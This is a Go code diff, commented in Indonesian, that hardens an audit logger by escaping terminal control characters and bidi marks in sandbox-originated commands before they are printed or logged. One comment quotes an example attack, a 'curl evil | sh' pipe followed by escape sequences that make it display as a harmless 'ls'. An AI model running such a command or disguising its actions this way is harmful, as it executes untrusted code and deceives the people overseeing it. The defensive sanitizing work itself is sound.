@@ -10,6 +10,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"unicode/utf8"
 )
 
 const (
@@ -52,14 +53,15 @@ func OpenAudit(path string, now func() time.Time) (*Audit, error) {
 	return &Audit{Path: path, f: f, run: hex.EncodeToString(id[:]), now: now}, nil
 }
 
-// Log — satu peristiwa. detail diratakan menjadi satu baris.
+// Log — satu peristiwa. event dan detail (bisa berasal dari box) dinetralkan
+// dengan Printable: satu baris, tanpa karakter kontrol mentah.
 func (a *Audit) Log(event, detail string) {
 	if a == nil {
 		return
 	}
-	line := a.now().Format("2006-01-02T15:04:05-07:00") + " [" + a.run + "] " + event
+	line := a.now().Format("2006-01-02T15:04:05-07:00") + " [" + a.run + "] " + Printable(event)
 	if detail != "" {
-		line += " " + oneLine(detail)
+		line += " " + Printable(detail)
 	}
 	a.mu.Lock()
 	defer a.mu.Unlock()
@@ -92,13 +94,64 @@ func QuoteCommand(cmd string) string {
 	return strconv.Quote(cmd)
 }
 
-func oneLine(s string) string {
-	return strings.Map(func(r rune) rune {
-		if r == '\n' || r == '\r' {
-			return ' '
+// Printable — teks (terutama asal box: perintah Bash, path, nama tool) yang
+// aman dicetak ke terminal atau ditulis ke log audit: karakter kontrol C0
+// (termasuk \n \r \t), DEL, C1, pemisah baris/paragraf Unicode, dan penanda
+// arah teks (bidi) diganti escape yang TERLIHAT (`\x1b`, `\n`, `\u009b`,
+// `\u202e`). Tanpa ini box bisa menyamarkan aksinya, mis. perintah
+// "curl evil | sh\x1b[1G\x1b[2K$ ls" tampil sebagai "$ ls". Teks Unicode
+// biasa (huruf non-Latin, emoji) tidak diubah; byte UTF-8 rusak → U+FFFD.
+func Printable(s string) string { return printable(s, false) }
+
+// PrintableLines — seperti Printable, tetapi "\n" dibiarkan (pesan lokal
+// bertingkat); karakter kontrol lain tetap di-escape.
+func PrintableLines(s string) string { return printable(s, true) }
+
+func printable(s string, keepNL bool) string {
+	clean := utf8.ValidString(s)
+	for _, r := range s {
+		if clean && hiddenRune(r) && !(keepNL && r == '\n') {
+			clean = false
 		}
-		return r
-	}, s)
+	}
+	if clean {
+		return s
+	}
+	var b strings.Builder
+	b.Grow(len(s) + 16)
+	for _, r := range s { // byte rusak → utf8.RuneError (U+FFFD)
+		switch {
+		case keepNL && r == '\n':
+			b.WriteRune(r)
+		case r == '\n':
+			b.WriteString(`\n`)
+		case r == '\r':
+			b.WriteString(`\r`)
+		case r == '\t':
+			b.WriteString(`\t`)
+		case hiddenRune(r) && r < utf8.RuneSelf:
+			fmt.Fprintf(&b, `\x%02x`, r)
+		case hiddenRune(r):
+			fmt.Fprintf(&b, `\u%04x`, r)
+		default:
+			b.WriteRune(r)
+		}
+	}
+	return b.String()
+}
+
+// hiddenRune — karakter yang mengendalikan terminal atau mengubah urutan
+// tampilan teks, bukan menampilkan huruf.
+func hiddenRune(r rune) bool {
+	switch {
+	case r < 0x20, r == 0x7f, r >= 0x80 && r <= 0x9f: // C0, DEL, C1
+		return true
+	case r == 0x2028, r == 0x2029: // pemisah baris/paragraf
+		return true
+	case r == 0x061c, r == 0x200e, r == 0x200f, r >= 0x202a && r <= 0x202e, r >= 0x2066 && r <= 0x2069: // bidi
+		return true
+	}
+	return false
 }
 
 // Short — ringkas untuk terminal: spasi dirapatkan, dipotong n karakter
